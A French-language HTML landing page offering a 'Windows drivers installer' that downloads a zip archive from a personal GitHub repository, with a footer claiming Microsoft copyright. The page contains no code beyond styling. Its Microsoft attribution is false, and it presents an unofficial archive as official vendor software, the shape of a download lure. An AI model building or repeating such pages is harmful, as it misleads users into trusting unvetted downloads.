<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Installateur de Drivers Windows</title>
    <style>
        /* Style général du site */
        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        /* Conteneur principal */
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.9);
            border-radius: 16px;
            padding: 40px 30px;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
        }

        /* En-tête */
        h1 {
            font-size: 2.5rem;
            margin-bottom: 15px;
            color: #1e3c72;
        }

        p {
            font-size: 1.1rem;
            line-height: 1.6;
            color: #555;
            margin-bottom: 20px;
        }

        /* Bouton de téléchargement */
        .btn {
            display: inline-block;
            margin-top: 20px;
            padding: 15px 30px;
            font-size: 1.2rem;
            font-weight: bold;
            color: #fff;
            background: linear-gradient(90deg, #43cea2, #185a9d);
            border: none;
            border-radius: 8px;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s ease;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
        }

        .btn:hover {
            background: linear-gradient(90deg, #185a9d, #43cea2);
            transform: scale(1.05);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        }

        /* Pied de page */
        .footer {
            margin-top: 30px;
            font-size: 0.9rem;
            color: #888;
        }

        /* Animation subtile */
        .background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: -1;
        }

        .circle {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            animation: float 15s linear infinite;
        }

        .circle:nth-child(1) {
            width: 150px;
            height: 150px;
            top: 20%;
            left: 30%;
        }

        .circle:nth-child(2) {
            width: 200px;
            height: 200px;
            top: 70%;
            left: 80%;
        }

        .circle:nth-child(3) {
            width: 100px;
            height: 100px;
            top: 40%;
            left: 50%;
        }

        @keyframes float {
            0% {
                transform: translateY(0) rotate(0deg);
            }
            50% {
                transform: translateY(-20px) rotate(180deg);
            }
            100% {
                transform: translateY(0) rotate(360deg);
            }
        }
    </style>
</head>
<body>
    <!-- Arrière-plan animé -->
    <div class="background">
        <div class="circle"></div>
        <div class="circle"></div>
        <div class="circle"></div>
    </div>

    <div class="container">
        <h1>Installateur de Drivers Windows</h1>
        <p>
            Cliquez sur le bouton ci-dessous pour télécharger l'archive contenant tous les fichiers nécessaires pour l'installation des drivers.
        </p>
        <!-- Bouton de téléchargement -->
        <a href="https://github.com/NeXuSS6N/Windows-Drivers/raw/refs/heads/main/Drivers.zip" class="btn" download>
            Télécharger le fichier .zip
        </a>
        <div class="footer">
            © 2025 Microsoft Corporation. Tous droits réservés.
        </div>
    </div>
</body>
</html>
